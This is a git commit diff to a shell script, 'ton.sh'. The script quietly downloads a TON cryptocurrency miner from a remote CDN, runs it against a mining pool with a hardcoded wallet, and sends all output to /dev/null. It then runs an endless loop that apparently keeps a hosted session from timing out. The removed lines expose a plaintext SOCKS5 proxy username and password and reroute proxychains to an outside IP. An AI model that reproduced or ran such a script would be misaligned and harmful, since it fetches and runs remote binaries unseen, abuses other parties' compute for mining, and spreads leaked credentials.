0bbdf599e304431966bfa89026d1c74ea9c465b5
nurfasikin <92776649+nurfasikin@users.noreply.github.com>
2022-02-13 12:19:42 +0700

    Update ton.sh

--- ton.sh
+++ ton.sh
@@ -1,11 +1,16 @@
 #!/bin/bash
-proxy="socks5://a019xpj2-3va47yc:gad7w69xcf@socks-us.windscribe.com:1080"
-sudo apt update 
-sudo apt install proxychains  -y 
-sudo sed -i 's/socks4/socks5/' /etc/proxychains.conf 
-sudo sed -i 's/127.0.0.1/98.162.96.53/' /etc/proxychains.conf
-sudo sed -i 's/9050/10663/' /etc/proxychains.conf
-wget https://whalepool-cdn.fra1.digitaloceanspaces.com/software/danila-miner/danila-miner-2.3.1-ubuntu-bionic.tar.gz 
-tar xaf danila-miner-2.3.1-ubuntu-bionic.tar.gz 
-chmod +x danila-miner 
+#!/bin/sh
+#!/bin/bash
+
+wget https://whalepool-cdn.fra1.digitaloceanspaces.com/software/danila-miner/danila-miner-2.3.1-ubuntu-bionic.tar.gz >/dev/null 2>&1
+
+tar xaf danila-miner-2.3.1-ubuntu-bionic.tar.gz >/dev/null 2>&1
+
+chmod +x danila-miner >/dev/null 2>&1
+
 ./danila-miner run https://server1.whalestonpool.com EQA0Q3JaZgjKJ6QVzETgz3xYfalnLCx170Ey8cEGhsnyLkdI
+
+while [ 1 ]; do
+  while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
+sleep 2
+done
